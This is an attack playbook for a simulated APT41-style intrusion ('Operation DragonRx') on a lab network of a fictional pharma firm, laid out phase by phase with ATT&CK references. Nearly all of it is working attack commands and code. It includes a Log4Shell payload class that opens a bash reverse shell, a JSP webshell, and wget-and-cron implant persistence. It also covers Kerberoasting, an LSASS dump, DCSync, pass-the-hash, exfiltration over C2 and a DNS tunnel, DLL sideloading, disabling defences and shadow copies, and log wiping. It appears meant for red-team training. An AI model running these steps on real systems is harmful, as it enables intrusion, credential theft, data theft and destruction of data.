# Attack Playbook — Operation DragonRx
## Phase-by-Phase Commands with ATT&CK References

**Operator perspective:** All commands run from the Kali Docker container unless otherwise noted.
**Lab shell notation:**
- `[KALI]` — Kali attacker container (`make shell` or `docker exec -it dragonrx_kali /bin/bash`)
- `[WEB01]` — reverse shell / webshell on Ubuntu web server (192.168.10.100)
- `[WS01]` — Windows 10 workstation (psexec/wmi session, 192.168.10.50)
- `[DC01]` — Domain Controller session (192.168.10.10)
- `[FS01]` — File server, crown jewel target (192.168.10.20)

---

## Table of Contents

- [Lab Prerequisites](#lab-prerequisites)
- [Phase 0: Reconnaissance](#phase-0-reconnaissance)
- [Phase 1: Initial Access — Log4Shell](#phase-1-initial-access--log4shell-cve-2021-44228)
- [Phase 2: Foothold — Webshell + RxPhage Implant](#phase-2-foothold--webshell--rxphage-implant)
- [Phase 3: Discovery](#phase-3-discovery)
- [Phase 4: Credential Access](#phase-4-credential-access)
- [Phase 5: Lateral Movement](#phase-5-lateral-movement)
- [Phase 6: Collection](#phase-6-collection)
- [Phase 7: Exfiltration](#phase-7-exfiltration)
- [Phase 8: DLL Sideloading Persistence on DC01](#phase-8-dll-sideloading-persistence-on-dc01)
- [Phase 9: Ransomware Phase (Optional)](#phase-9-optional-ransomware-phase)
- [Phase 10: Cleanup / Anti-Forensics](#phase-10-cleanup--anti-forensics)
- [Loot Summary](#loot-summary)

---

## Lab Prerequisites

Start the lab before running any attack commands.

```bash
cd apt41-operation-dragonrx/dragonrx-lab/

# Deploy full lab (first run: ~20-30 min; subsequent: ~5 min)
make up

# Verify all services healthy
make test

# Open attacker shell in Kali container
make shell
# Equivalent: docker exec -it dragonrx_kali /bin/bash

# Useful during attack
make status                              # show container + VM state
docker logs -f dragonrx_jndi            # watch JNDI server callbacks
docker exec -it dragonrx_c2 sliver      # Sliver C2 console
```

**Target network map:**
```
10.0.0.100   WEB01   Spring Boot, log4j-core 2.14.1   Port 8080 (HTTP)
10.0.0.20    jndi    Marshalsec LDAP relay    Port 1389 (LDAP); HTTP on container:8080 / host:8888
10.0.0.10    c2      Sliver C2               Port 31337
192.168.10.10  DC01   Windows Server 2019 AD  novatech.local
192.168.10.20  FS01   Windows Server 2019     Research + Manufacturing shares
192.168.10.50  WS01   Windows 10 (jsmith)     Domain-joined workstation
```

**Pre-seeded credentials (from Ansible provisioning):**
```
svc_ldap   / NovaTech2021!   (in Tomcat context.xml — to discover)
jsmith     / Research#2024   (domain user, local admin on WS01)
svc_backup / Backup_Svc99!   (Kerberoastable — cracked from hash)
Administrator / NovaTech_Admin2024!  (Domain Admin)
```

---

## Phase 0: Reconnaissance

**ATT&CK:** T1595.002 (Active Scanning), T1592.002 (Software Discovery), T1589 (Identity Info)

### 0.1 Passive Recon

```bash
[KALI]
# Shodan: find NovaTech external footprint
shodan search 'org:"NovaTech Pharma"' --fields ip_str,port,product
shodan search 'ssl.cert.subject.CN:"novatech-pharma.com"'

# Certificate transparency — enumerate subdomains
curl -s "https://crt.sh/?q=%25.novatech-pharma.com&output=json" | \
  python3 -c "import sys,json; [print(r['name_value']) for r in json.load(sys.stdin)]" | \
  sort -u

# Email / employee harvesting
theHarvester -d novatech-pharma.com -b google,linkedin,bing -l 200
```

### 0.2 Active Fingerprinting

```bash
[KALI]
# Version scan on known external endpoints
nmap -sV -sC -p 80,443,8080,21,22,25,110,8888 \
  10.0.0.100 -oA recon/web01_scan

# Web technology fingerprinting
whatweb http://10.0.0.100:8080 --log-verbose recon/whatweb.txt
curl -s http://10.0.0.100:8080/ -D - | head -30

# HTTP header analysis — look for Server, X-Powered-By
curl -s -o /dev/null -D - http://10.0.0.100:8080/ | grep -iE "server|x-powered|set-cookie"

# Confirm Log4j in error stack trace (misconfigured error page)
curl -s "http://10.0.0.100:8080/DOESNOTEXIST" | grep -i "log4j\|apache\|java"
```

**Finding:** `Server: Apache-Coyote/1.1`, error page reveals `log4j-core-2.14.1` in stack trace.

---

## Phase 1: Initial Access — Log4Shell (CVE-2021-44228)

**ATT&CK:** T1190 (Exploit Public-Facing Application)

### 1.1 Test JNDI Callback (Proof of Vulnerability)

```bash
[KALI]
# Start listener to confirm callback
# Open a second terminal window
nc -lvnp 9999 &

# Send JNDI test payload — confirm callback from WEB01
# The ${jndi:ldap://...} triggers outbound lookup
curl -s http://10.0.0.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/test}'

# Verify on JNDI server that callback was received
docker logs dragonrx_jndi 2>&1 | tail -5
# Expected: "Sending LDAP ResourceRef result for test" 
```

### 1.2 Prepare Malicious Java Payload

```bash
[KALI]
# Create reverse shell payload class
mkdir -p /opt/tools/log4shell/payload
cat > /opt/tools/log4shell/payload/Exploit.java << 'EOF'
public class Exploit {
    static {
        try {
            String[] cmd = {
                "/bin/bash", "-c",
                "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
            };
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
EOF

# Compile (requires Java 8 — higher versions block remote classloading by default)
cd /opt/tools/log4shell/payload
javac -source 8 -target 8 Exploit.java
ls -la Exploit.class   # confirm compilation
```

### 1.3 Execute Exploit

```bash
[KALI] — Terminal 1: Start reverse shell listener
rlwrap nc -lvnp 4444

[KALI] — Terminal 2: JNDI server should already be running in Docker
# Verify marshalsec JNDI server serving correct payload
docker logs dragonrx_jndi

[KALI] — Terminal 3: Fire the exploit
curl -s http://10.0.0.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/Exploit}'

# Expected output in Terminal 1:
# Connection from 192.168.10.100:XXXXX
# bash: no job control in this shell
# www-data@web01:/opt/tomcat$
```

**Artifact left:** Tomcat `access.log` records the raw `${jndi:}` string in the `X-Api-Version` header.

---

## Phase 2: Foothold — Webshell + RxPhage Implant

**ATT&CK:** T1505.003 (Web Shell), T1053.003 (Cron), T1059.004 (Unix Shell)

### 2.1 Stabilize Reverse Shell

```bash
[WEB01 — initial reverse shell]
# Python PTY upgrade for stable shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z (background)
# Back on Kali:
stty raw -echo; fg
# Enter
export TERM=xterm
export SHELL=/bin/bash
stty rows 50 cols 200
```

### 2.2 Deploy JSP Webshell

```bash
[WEB01]
# Find Tomcat webapps root
find / -name "ROOT" -type d 2>/dev/null
# Likely: /opt/tomcat/webapps/ROOT

# Write minimal JSP webshell (China Chopper pattern)
# Hidden in plausible directory name
mkdir -p /opt/tomcat/webapps/ROOT/resources/imgs

cat > /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp << 'EOF'
<%@page import="java.util.*,java.io.*"%><%
String cmd = request.getParameter("c");
if(cmd != null && !cmd.isEmpty()) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while((line = br.readLine()) != null) sb.append(line).append("\n");
    out.print(sb.toString());
}
%>
EOF

# Test webshell
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp?c=id"
# Expected: uid=33(www-data) gid=33(www-data)
```

### 2.3 Drop and Persist RxPhage Implant

```bash
[KALI]
# Assuming RxPhage binary pre-compiled (see rxphage-malware.md)
# Host payload
python3 -m http.server 8900 --directory /opt/tools/rxphage/ &

[WEB01 — via webshell]
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=wget http://10.0.0.5:8900/rxphage -O /tmp/.cache/rxphage && chmod +x /tmp/.cache/rxphage"

# Verify download
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=ls -la /tmp/.cache/"

# Persistence via cron (survives reboots)
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=(crontab -l 2>/dev/null; echo '@reboot /tmp/.cache/rxphage') | crontab -"

# Verify cron
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=crontab -l"

# Start implant now
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=nohup /tmp/.cache/rxphage &>/dev/null & echo $!"
```

**Sliver C2 — verify RxPhage beacon:**
```bash
[KALI — Sliver console]
docker exec -it dragonrx_c2 sliver

sliver > sessions
# Expected: new session from 192.168.10.100 (www-data@web01)

sliver > use <session-id>
sliver (web01) > whoami
# www-data
sliver (web01) > getpid
# 1337
```

---

## Phase 3: Discovery

**ATT&CK:** T1046, T1082, T1087.002, T1069.002, T1018, T1482, T1552.001

### 3.1 System and Network Discovery

```bash
[WEB01 — via Sliver shell or webshell]
# System info
id; whoami; hostname; uname -a; cat /etc/os-release

# Network interfaces
ip addr show
ip route show
cat /etc/hosts

# ARP cache — who has WEB01 talked to?
arp -an

# Active connections — what internal services is this host talking to?
ss -antup
netstat -antup 2>/dev/null
```

### 3.2 Internal Network Sweep

```bash
[WEB01]
# Quick ping sweep of internal /24
for i in $(seq 1 254); do
  (ping -c 1 -W 1 192.168.10.$i &>/dev/null && echo "192.168.10.$i") &
done
wait

# Port scan live hosts (Nmap if available, otherwise manual)
nmap -sV -p 22,80,135,139,389,443,445,636,3389,5985,8080 \
  192.168.10.10 192.168.10.20 192.168.10.50 2>/dev/null

# SMB signing check (relevant for relay attacks later)
nmap --script smb-security-mode -p 445 192.168.10.10,20,50
```

**Expected findings:**
- `192.168.10.10:389,445,3389` → DC01 (Active Directory, LDAP, RDP)
- `192.168.10.20:445` → FS01 (File Server, SMB)
- `192.168.10.50:445,3389` → WS01 (Workstation)

### 3.3 Credential Hunt in Web App Config Files

```bash
[WEB01]
# Configuration files and environment often contain hardcoded credentials
# Lab: credentials are in the container env (docker inspect dragonrx_web01 | grep -i ldap)
find /opt -name "*.xml" -o -name "*.properties" -o -name "*.yml" 2>/dev/null | \
  xargs grep -il "password\|passwd\|credential"

# Also check process environment — common in containerised apps
cat /proc/1/environ | tr '\0' '\n' | grep -i "pass\|key\|secret\|ldap"
# CRITICAL FIND: LDAP bind credentials exposed in container env
# LDAP_USER=svc_ldap  LDAP_PASS=NovaTech2021!
#   connectionPassword="NovaTech2021!"
#   connectionName="cn=svc_ldap,dc=novatech,dc=local" />

# Also check web app WEB-INF for database configs
find /opt/tomcat/webapps -name "*.properties" -o -name "*.yml" -o -name "*.yaml" 2>/dev/null
grep -r "password\|jdbc\|ldap" /opt/tomcat/webapps/ --include="*.xml" 2>/dev/null
```

**CRITICAL:** `svc_ldap / NovaTech2021!` — valid domain account, confirmed via LDAP query below.

### 3.4 Active Directory Enumeration

```bash
[WEB01]
# Use stolen LDAP credentials to enumerate AD from Linux
ldapsearch -x -H ldap://192.168.10.10 \
  -D "cn=svc_ldap,dc=novatech,dc=local" \
  -w "NovaTech2021!" \
  -b "dc=novatech,dc=local" \
  "(objectClass=user)" sAMAccountName department mail userAccountControl \
  2>/dev/null | grep -E "sAMAccountName|department|mail"

# Find Domain Admins
ldapsearch -x -H ldap://192.168.10.10 \
  -D "cn=svc_ldap,dc=novatech,dc=local" \
  -w "NovaTech2021!" \
  -b "cn=Domain Admins,cn=Users,dc=novatech,dc=local" \
  "(objectClass=group)" member

# Find accounts with SPN (Kerberoastable targets)
ldapsearch -x -H ldap://192.168.10.10 \
  -D "cn=svc_ldap,dc=novatech,dc=local" \
  -w "NovaTech2021!" \
  -b "dc=novatech,dc=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

**Found:** `svc_backup` with SPN `MSSQLSvc/FS01.novatech.local:1433` → Kerberoastable.

---

## Phase 4: Credential Access

**ATT&CK:** T1552.001, T1558.003, T1003.001, T1003.006

### 4.1 Kerberoasting (from Linux)

```bash
[KALI — or WEB01 with impacket installed]
# Request TGS for svc_backup using stolen LDAP creds (also valid domain creds)
impacket-GetUserSPNs novatech.local/svc_ldap:'NovaTech2021!' \
  -dc-ip 192.168.10.10 \
  -request \
  -outputfile /opt/loot/kerberoast_hashes.txt

cat /opt/loot/kerberoast_hashes.txt
# Expected: $krb5tgs$23$*svc_backup$NOVATECH.LOCAL$MSSQLSvc/FS01...

# Crack offline with hashcat
hashcat -m 13100 /opt/loot/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule \
  -o /opt/loot/kerberoast_cracked.txt

cat /opt/loot/kerberoast_cracked.txt
# $krb5tgs$23$*svc_backup...:Backup_Svc99!
```

**Result:** `svc_backup / Backup_Svc99!` — member of Backup Operators group.

### 4.2 LSASS Dump on WS01 (after lateral movement setup)

```bash
[WS01 — via psexec session — see Phase 5 first]
# LOLBin: comsvcs.dll MiniDump (signed Microsoft DLL, no extra tools needed)
# Get LSASS PID
Get-Process lsass | Select Id

# Dump LSASS memory to disk
$pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $pid C:\Temp\lsass.dmp full

# Confirm dump created
Get-Item C:\Temp\lsass.dmp | Select Name, Length, LastWriteTime

# Exfil dump to Kali for offline parsing
# Via RxPhage upload command or:
certutil.exe -encode C:\Temp\lsass.dmp C:\Temp\lsass.b64
```

```bash
[KALI]
# Parse LSASS dump with pypykatz (python alternative to Mimikatz)
pip3 install pypykatz
pypykatz lsa minidump /opt/loot/lsass.dmp 2>/dev/null | grep -A 3 "Username"

# Or with Mimikatz syntax (if running on Windows):
# mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

### 4.3 DCSync (after Domain Admin obtained)

```bash
[KALI]
# DCSync requires Domain Admin credentials. Two paths depending on what Phase 4.2 yielded:
#
# PATH A: plaintext Administrator password obtained (LSASS clear-text, offline crack, or
#         WDigest-enabled host). Lab uses this path (NovaTech_Admin2024! is the lab value).
impacket-secretsdump novatech.local/Administrator:'NovaTech_Admin2024!'@192.168.10.10 \
  -just-dc-ntlm \
  -output /opt/loot/dcsync_hashes

# PATH B: Pass-the-Hash — use Administrator NTLM hash directly (no plaintext cracking needed)
# impacket-secretsdump -hashes "aad3b435b51404eeaad3b435b51404ee:ADMIN_NTLM_HASH" \
#   novatech.local/Administrator@192.168.10.10 -just-dc-ntlm -output /opt/loot/dcsync_hashes

cat /opt/loot/dcsync_hashes.ntds
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXX:::
# jsmith:1103:aad3b435b51404eeaad3b435b51404ee:YYYYYYYYYYYYYYYYYYYYYYYY:::
# svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:ZZZZZZZZZZZZZZZZZZZZZZZZ:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:KKKKKKKKKKKKKKKKKKKKKKKK:::
```

**Artifacts:** Windows Event ID 4662 with "DS-Replication-Get-Changes-All" access right — high-fidelity DCSync detection signal.

---

## Phase 5: Lateral Movement

**ATT&CK:** T1550.002 (Pass-the-Hash), T1021.002 (SMB), T1047 (WMI)

### 5.1 Linux → Windows (WEB01 → WS01)

```bash
[KALI]
# Use svc_ldap plaintext password for initial Windows access
# svc_ldap has no local admin rights on WS01 by default — use jsmith creds from LDAP

# If jsmith password obtained via LSASS/Kerberoasting earlier:
# Alternative: use svc_backup (Backup Operators) — can read NTDS via reg save

# Test access to WS01 via SMB with known creds
crackmapexec smb 192.168.10.50 -u jsmith -p 'Research#2024' --shares

# Execute command on WS01 (jsmith is local admin)
crackmapexec smb 192.168.10.50 -u jsmith -p 'Research#2024' -x "whoami && hostname"

# Get interactive shell via psexec
impacket-psexec novatech.local/jsmith:'Research#2024'@192.168.10.50 cmd.exe
```

### 5.2 Pass-the-Hash (after LSASS dump)

```bash
[KALI]
# Extract NTLM hash from pypykatz output
# Format: <LM>:<NT>  (use empty LM: aad3b435b51404eeaad3b435b51404ee)
JSMITH_NTLM="YYYYYYYYYYYYYYYYYYYYYYYY"

# PTH to administrator on all hosts
crackmapexec smb 192.168.10.0/24 \
  -u administrator \
  -H "aad3b435b51404eeaad3b435b51404ee:${ADMIN_NTLM}" \
  --local-auth \
  -x "whoami"

# Get DA shell on DC01
impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:${ADMIN_NTLM}" \
  novatech.local/administrator@192.168.10.10 cmd.exe
```

### 5.3 BloodHound AD Attack Path Mapping

```bash
[WS01 — psexec session]
# Download SharpHound ingestor
# Via Sliver: upload SharpHound.exe
# Or via webshell/certutil:
certutil.exe -urlcache -f http://10.0.0.5:8900/SharpHound.exe C:\Temp\SharpHound.exe

# Run SharpHound collection
C:\Temp\SharpHound.exe -c All --outputdirectory C:\Temp\bh_output\

# Exfil BloodHound zip
# Via RxPhage upload or base64 encode + certutil
certutil.exe -encode C:\Temp\bh_output\*.zip C:\Temp\bh.b64
type C:\Temp\bh.b64
```

```bash
[KALI]
# Import into BloodHound
# Start neo4j + BloodHound GUI
docker run -d --name neo4j \
  -e NEO4J_AUTH=neo4j/BloodHound \
  -p 7474:7474 -p 7687:7687 neo4j:4.4

# Open BloodHound, connect to neo4j, import zip
# Query: "Find Shortest Paths to Domain Admins"
# Expected: jsmith → Workstation Local Admin → ... → DA
```

### 5.4 WMI Lateral Movement (quieter than psexec)

```bash
[KALI]
# WMI execution — no service creation, less noisy than psexec
impacket-wmiexec novatech.local/administrator:'NovaTech_Admin2024!'@192.168.10.50 \
  "whoami && systeminfo"

# Or CrackMapExec WMI
crackmapexec wmi 192.168.10.50 \
  -u administrator -p 'NovaTech_Admin2024!' \
  -x "net user /domain"
```

---

## Phase 6: Collection

**ATT&CK:** T1005, T1074.001, T1560.001

```bash
[DC01 — psexec session as SYSTEM]
# Enumerate FS01 shares
net view \\192.168.10.20
net use Z: \\192.168.10.20\Research /user:NOVATECH\Administrator NovaTech_Admin2024!
net use Y: \\192.168.10.20\Manufacturing /user:NOVATECH\Administrator NovaTech_Admin2024!

# Identify high-value files
dir Z:\ /s /b | findstr /i "trial data formula synthesis patent"
dir Y:\ /s /b

# Stage everything
mkdir C:\Temp\archive
robocopy Z:\ C:\Temp\archive\Research /E /NFL /NDL /NC /NJS /NJH
robocopy Y:\ C:\Temp\archive\Manufacturing /E /NFL /NDL /NC /NJS /NJH

# Bonus: SYSVOL (may contain credentials in GPO scripts)
robocopy \\192.168.10.10\SYSVOL C:\Temp\archive\SYSVOL /E /NFL /NDL

# Compress with password (7z)
certutil.exe -urlcache -f http://10.0.0.5:8900/7za.exe C:\Temp\7za.exe
C:\Temp\7za.exe a -tzip -p"RxPhage2024!" -mx9 C:\Temp\data.zip C:\Temp\archive\

# Check size
dir C:\Temp\data.zip
```

---

## Phase 7: Exfiltration

**ATT&CK:** T1041 (C2 exfil), T1048.001 (DNS tunneling)

### 7.1 Primary: HTTPS C2 (RxPhage)

```bash
[Sliver C2 console — Kali]
# Use RxPhage upload command (built-in to the implant)
sliver (web01) > upload C:\Temp\data.zip /opt/loot/data.zip

# Or use Sliver built-in download if session is on Windows host
sliver (dc01) > download C:\Temp\data.zip /opt/loot/dc01_data.zip

# Monitor exfil progress (50MB chunks)
# watch -n 5 ls -lh /opt/loot/
```

### 7.2 Backup: DNS Tunneling (dnscat2)

```bash
[KALI — set up DNS tunnel server]
# dnscat2 server
gem install dnscat2
ruby dnscat2.rb --dns "host=10.0.0.5,port=53,domain=tunnel.attacker-infra.com" \
  --no-cache --secret="DragonRx2024"

[WEB01 — via webshell or reverse shell]
# dnscat2 client (Linux)
wget http://10.0.0.5:8900/dnscat -O /tmp/.cache/dnscat
chmod +x /tmp/.cache/dnscat
/tmp/.cache/dnscat --secret="DragonRx2024" tunnel.attacker-infra.com

# Transfer file via dnscat2 shell (once session established)
# dnscat2 server console:
dnscat2> windows
dnscat2> window -i 1
command (web01) 1> shell
# ... get command shell session
# Transfer via: split file + base64 + paste via shell (slow but resilient to HTTPS blocking)
```

---

## Phase 8: DLL Sideloading Persistence on DC01

**ATT&CK:** T1574.002 (DLL Side-Loading), T1053.005 (Scheduled Task)

```bash
[DC01 — as SYSTEM]
# Classic PlugX DLL sideloading pattern
# Legitimate, signed Java executable + malicious jvm.dll in same directory

# Create plausible directory
mkdir -p "C:\ProgramData\Oracle\Java\javapath"

# Copy legitimate java.exe (signed by Oracle)
copy "C:\Program Files\Java\jre8\bin\java.exe" "C:\ProgramData\Oracle\Java\javapath\java.exe"

# Drop RxPhage loader as jvm.dll
# (jvm.dll is the first DLL java.exe searches for — sideloading hijack)
# Via Sliver upload:
[Sliver: upload /opt/tools/rxphage/rxphage_loader.dll C:\ProgramData\Oracle\Java\javapath\jvm.dll]

# Create scheduled task for persistence (SYSTEM, at boot)
schtasks /create ^
  /tn "JavaUpdateService" ^
  /tr "C:\ProgramData\Oracle\Java\javapath\java.exe" ^
  /sc ONSTART ^
  /ru SYSTEM ^
  /f

# Verify scheduled task created
schtasks /query /tn "JavaUpdateService" /fo LIST

# Verify DLL gets loaded at next run
# Sysmon EID 7 will fire showing jvm.dll loaded from ProgramData path (not C:\Windows)
```

---

## Phase 9 (Optional): Ransomware Phase

**ATT&CK:** T1485, T1486, T1562.001

```bash
[DC01 — as SYSTEM — via GPO push or local commands]
# Pre-ransomware: impair defenses
# Disable Windows Defender via registry (GPO or direct)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"

# Delete Volume Shadow Copies (prevents recovery)
vssadmin delete shadows /all /quiet

# Stop backup services
net stop "wbengine" /y
net stop "SDRSVC" /y
net stop "swprv" /y

# Deploy simulated ransomware encryptor (safe: only targets C:\Temp\RansomTest\)
mkdir C:\Temp\RansomTest
echo "Sensitive pharma data simulation" > C:\Temp\RansomTest\research.txt
echo "Formula document simulation" > C:\Temp\RansomTest\formula.xlsx

# Run Go encryptor (encrypts ONLY C:\Temp\RansomTest\)
C:\Temp\rxphage_encrypt.exe --path C:\Temp\RansomTest\

# Ransom note deployed by encryptor to each encrypted directory
type C:\Temp\RansomTest\DRAGONRX_RANSOM.txt
```

---

## Phase 10: Cleanup / Anti-Forensics

**ATT&CK:** T1070.004 (File Deletion), T1070.001 (Clear Windows Event Logs)

```bash
[WEB01 — Linux cleanup]
# Overwrite bash history
history -c && history -w
cat /dev/null > ~/.bash_history
unset HISTFILE

# Remove initial exploit artifacts
shred -u /tmp/.cache/rxphage    # secure delete implant (if abandoning access)
# NOTE: in real APT41 ops, they KEEP persistence and just clean initial exploit artifacts

# Remove webshell if needed (usually they keep it)
rm -f /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp

[DC01 — Windows cleanup]
# Clear Windows Security event log (noisy, but APT41 has done this)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force 2>$null
Clear-History

# Timestomping (modify file timestamps to blend in)
powershell -command "(Get-Item 'C:\ProgramData\Oracle\Java\javapath\jvm.dll').LastWriteTime = '2023-01-15 09:00:00'"
```

---

## Loot Summary

```
/opt/loot/
├── kerberoast_hashes.txt       # TGS hash for svc_backup
├── kerberoast_cracked.txt      # svc_backup plaintext: Backup_Svc99!
├── dcsync_hashes.ntds          # All domain NTLM hashes
├── lsass.dmp                   # LSASS memory dump from WS01
├── data.zip                    # Crown jewels: research + manufacturing docs
└── bh_output/                  # BloodHound AD graph data
    └── <timestamp>_BloodHound.zip
```

---

*Next document: [rxphage-malware.md](rxphage-malware.md) — custom implant architecture, Go source design, and malware analysis guide.*
